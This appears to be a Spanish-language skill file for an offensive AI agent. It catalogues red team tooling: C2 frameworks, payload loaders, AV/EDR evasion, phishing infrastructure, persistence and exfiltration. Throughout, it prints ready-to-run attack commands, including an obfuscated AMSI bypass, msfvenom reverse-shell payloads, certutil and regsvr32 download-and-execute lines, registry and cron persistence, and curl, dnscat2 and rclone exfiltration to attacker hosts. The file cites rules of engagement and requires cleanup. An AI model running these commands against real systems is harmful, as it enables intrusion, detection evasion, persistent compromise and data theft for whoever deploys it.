# Herramientas de Red Team Operations — CLI Kali Linux

C2 frameworks, payload generation con evasión, infra del red team,
emulación adversarial. Sólo bajo RoE completo de red team auténtico.

---

## 1. C2 Frameworks

| Framework | Instalación | Comando de ejemplo |
|---|---|---|
| **Sliver** | `curl https://sliver.sh/install \| sudo bash` | `sliver-server` (interactivo); `generate --http <C2>:443 --os windows --arch amd64 --save shell.exe` |
| **Havoc** | `git clone https://github.com/HavocFramework/Havoc` | `./havoc server --profile profile.yaotl` (interactive client connect) |
| **Mythic** | `git clone https://github.com/its-a-feature/Mythic; sudo ./mythic-cli install github https://github.com/MythicAgents/apollo` | `sudo ./mythic-cli start` (web UI) |
| **Empire (PowerShell/Python)** | `git clone https://github.com/BC-SECURITY/Empire` | `sudo ./ps-empire server` + `sudo ./ps-empire client` |
| **Covenant (.NET)** | `git clone https://github.com/cobbr/Covenant` | `dotnet run --project ./Covenant/` |
| **Metasploit (legítimo)** | Preinstalado | sólo para test rápido en lab, no para op real (muy detectado) |
| **Pupy** | `git clone https://github.com/n1nj4sec/pupy` | `python3 pupysh.py` |
| **Cobalt Strike (comercial)** | licencia | `teamserver <ip> <pass>` + GUI client |

---

## 2. Payload Generation y Loaders

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **msfvenom** | Preinstalado | `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<c2> LPORT=443 -f csharp` |
| **donut (shellcode)** | `git clone https://github.com/TheWover/donut` | `./donut -i input.exe -o payload.bin -f 1` |
| **sgn (shellcode encoder)** | `go install github.com/EgeBalci/sgn@latest` | `sgn -a 64 -i shellcode.bin -o encoded.bin` |
| **Nimcrypt2** | `git clone https://github.com/icyguider/Nimcrypt2` | `nim c -d:release Nimcrypt2.nim; ./Nimcrypt2 -f shellcode.bin -t shellcode` |
| **PEzor** | `git clone https://github.com/phra/PEzor` | `./PEzor.sh -unhook -text input.exe` |
| **ScareCrow** | `git clone https://github.com/optiv/ScareCrow` | `./ScareCrow -I payload.bin -Loader binary -domain http://updates.example.com` |
| **Inceptor** | `git clone https://github.com/klezVirus/inceptor` | `python3 inceptor.py native -f shellcode.bin -o loader.exe` |
| **Mortar** | `git clone https://github.com/0xsp-SRD/mortar` | (build con MSVC) |
| **Sharpshooter** | `git clone https://github.com/mdsecactivebreach/SharpShooter` | `python SharpShooter.py --stageless --dotnetver 4 --payload hta --output payload --rawscfile shellcode.bin --awlurl http://attacker/foo --com xslremote` |

---

## 3. AV/EDR Evasion (overlap con skill `evasion`)

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **AMSI bypass (PowerShell)** | inline | `$a='Sys';$b='tem';$c='.Mana';$d='gement.Aut';$e='omation.A';$f='ms';$g='iUtils';[Ref].Assembly.GetType("$a$b$c$d$e$f$g").GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` |
| **defender-check** | `git clone https://github.com/matterpreter/DefenderCheck` | `DefenderCheck.exe payload.exe` (binary search del trigger) |
| **ThreatCheck** | `git clone https://github.com/rasta-mouse/ThreatCheck` | idem para Defender |
| **chimera (obfuscation)** | `git clone https://github.com/tokyoneon/Chimera` | `python3 chimera.py -f payload.ps1 -o obfuscated.ps1` |
| **Invoke-Obfuscation** | `git clone https://github.com/danielbohannon/Invoke-Obfuscation` | (Powershell) `Import-Module ./Invoke-Obfuscation.psd1; Invoke-Obfuscation` |
| **freeze.rs (process hollowing)** | `cargo install --git https://github.com/optiv/freeze.rs` | `freeze --shellcode beacon.bin --output beacon.exe` |
| **EDRSandblast** | `git clone https://github.com/wavestone-cdt/EDRSandBlast` | `EDRSandBlast.exe --usermode --kernelmode` (unhook user+kernel) |

---

## 4. Infrastructure-as-Code para Red Team

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **terraform** | `sudo apt install terraform` | `terraform apply` (auto-deploy C2 + redirectors + phishing infra) |
| **Red Baron** | `git clone https://github.com/Coalfire-Research/Red-Baron` | terraform modules para C2/phishing infra |
| **Ansible (red team)** | `sudo apt install ansible` | playbooks para hardening del C2, deploy automatizado |
| **traitor / drone** | `git clone https://github.com/leebaird/discover` | scripts de deploy rápido infra |

---

## 5. Redirectors y Domain Fronting

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **socat (redirector)** | `sudo apt install socat` | `socat TCP4-LISTEN:443,fork,reuseaddr TCP4:c2-internal:443` |
| **nginx (reverse proxy)** | `sudo apt install nginx` | config con `proxy_pass http://c2-internal; proxy_set_header User-Agent $http_user_agent;` |
| **HTTrack (clone site)** | `sudo apt install httrack` | `httrack https://target.com --output-dir clone/` |
| **Cloudflare Workers** | `npm install -g wrangler` | redirector serverless para C2 over CDN |
| **CDN domain fronting** | manual | AWS CloudFront / Azure Front Door / Cloudflare |

---

## 6. Phishing Infrastructure (overlap con `social_engineering`)

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **gophish** | release github | `./gophish` (interfaz admin :3333) |
| **evilginx2** | `git clone https://github.com/kgretzky/evilginx2` | `./evilginx -p ./phishlets` |
| **modlishka** | `git clone https://github.com/drk1wi/Modlishka` | `./dist/proxy -config target.json` |
| **king-phisher** | `sudo apt install king-phisher` | `king-phisher-server` + client |
| **swaks (test SMTP)** | Preinstalado | `swaks --to victim@target.com --from spoof@spoof.com --server smtp.relay.com` |
| **MailRipV3** | `git clone https://github.com/Vector-Security/MailRipV3` | SMTP-spray/check |
| **dnstwist** | Preinstalado | `dnstwist target.com --registered` (encontrar typo-squats disponibles) |

---

## 7. Living-off-the-Land (LOLBAS / GTFOBins)

| Plataforma | Recurso | Uso |
|---|---|---|
| **LOLBAS (Windows)** | lolbas-project.github.io | binarios firmados de Windows con uso ofensivo: `certutil`, `bitsadmin`, `mshta`, `regsvr32`, `installutil`, `cscript`, `wmic`, `rundll32`, `mavinject`, `wuauclt`, `msbuild` |
| **GTFOBins (Linux)** | gtfobins.github.io | SUID/sudo abuse |
| **LOOBins (macOS)** | loobins.io | macOS LOLBAS |
| **WTFBins** | wtfbins.wtf | misc curiosidades |

Ejemplo LOLBAS típico:
- `certutil -urlcache -split -f https://c2/payload payload.exe`
- `mshta vbscript:Close(Execute("CreateObject(""Wscript.Shell"").Run ""calc.exe"""))`
- `regsvr32 /s /n /u /i:http://c2/payload.sct scrobj.dll` (squiblydoo)

---

## 8. Persistence (sólo con RoE)

| Plataforma | Técnica | Comando |
|---|---|---|
| **Windows · Registry Run** | `reg add` | `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Windows\Temp\updater.exe"` |
| **Windows · Scheduled Task** | `schtasks` | `schtasks /create /sc minute /mo 30 /tn "WindowsUpdate" /tr "C:\Windows\Temp\u.exe" /f` |
| **Windows · WMI Event Subscription** | `wmic` o PowerShell | uso complejo via `__EventConsumer` (alta OPSEC) |
| **Windows · Service** | `sc create` | `sc create UpdaterSvc binPath= "C:\Windows\Temp\u.exe" start= auto` |
| **Windows · DLL hijack** | manual | colocar DLL en path de carga |
| **Linux · cron user** | `crontab -e` | `*/10 * * * * /tmp/.cache/u >/dev/null 2>&1` |
| **Linux · systemd user** | manual | `~/.config/systemd/user/foo.service` |
| **Linux · bashrc** | manual | append a `~/.bashrc` o `/etc/bash.bashrc` |
| **Linux · SSH authorized_keys** | manual | append a `~/.ssh/authorized_keys` (sólo lab) |
| **Cron @reboot** | `crontab -e` | `@reboot /tmp/.cache/u` |

---

## 9. Exfiltración (a infra controlada del red team)

| Herramienta | Instalación | Comando de ejemplo |
|---|---|---|
| **curl (HTTPS)** | Preinstalado | `curl -F file=@data.tar.gz https://exfil.attacker.tld/upload` |
| **dnscat2 (DNS exfil)** | `git clone https://github.com/iagox86/dnscat2` | server: `./dnscat2 attacker.tld --secret=KEY`; client: `./dnscat --secret=KEY attacker.tld` |
| **iodine (DNS tunneling)** | `sudo apt install iodine` | server: `iodined -P pass 10.0.0.1 tun.attacker.tld`; client: `iodine -P pass tun.attacker.tld` |
| **chisel (HTTP tunnel)** | `go install github.com/jpillora/chisel@latest` | reverse SOCKS5 |
| **ligolo-ng** | release github | tunneling avanzado |
| **rclone (cloud upload)** | `sudo apt install rclone` | `rclone copy data.tar.gz attacker-s3:bucket/` |
| **plink (Windows SSH)** | release putty | `plink -ssh -batch -pw pass -R 8080:internal:80 user@attacker` |

---

## 10. C2 Profile Tools / Malleable Profiles

| Herramienta | Para qué | Comando |
|---|---|---|
| **C2concealer** | `git clone https://github.com/FortyNorthSecurity/C2concealer` | `python3 C2concealer --hostname c2.attacker.com --variant 1` (genera profile CS) |
| **Mythic profiles** | en Mythic | Edit profiles via UI / files |
| **CrossC2** | crossover host/payload | profiles cross-platform |

---

## 11. Reporting / Atomic Red Team Mapping

| Herramienta | Instalación | Uso |
|---|---|---|
| **MITRE Navigator** | navegador | crear matriz visual de TTPs ejecutados |
| **atomic-red-team** | `git clone https://github.com/redcanaryco/atomic-red-team` | reference: definiciones de tests por TTP |
| **VECTR (purple team tracking)** | docker | DB de attacks + detections |
| **Sigma rules** | `git clone https://github.com/SigmaHQ/sigma` | mapear detecciones que el SOC debería haber generado |
| **DeTT&CT** | `git clone https://github.com/rabobank-cdc/DeTTECT` | scoring de visibilidad/coverage |

---

## Resumen de Disponibilidad

| Estado | Cantidad |
|---|---|
| **C2 frameworks principales** | 8 |
| **Payload tools** | ~10 |
| **Evasion tools** | ~7 |
| **Infra/redirectors** | ~10 |
| **Phishing** | ~7 |
| **Exfil tools** | ~7 |
| **Total** | **~50 herramientas/frameworks** |

---

## Alcance

Operaciones red team de full kill chain. Esta skill **orquesta** la
mayoría de las otras skills ofensivas del agente. NO usar como skill
standalone — necesita combinar con `recon`, `osint_personas`,
`social_engineering`, `exploitation`, `post_exploitation`, `evasion`,
`lateral_movement`, `internal_network_audit`.

Cleanup obligatorio al cierre. Sin cleanup, el cliente queda con
implants/persistencia activa real y la responsabilidad legal recae
sobre el operador.
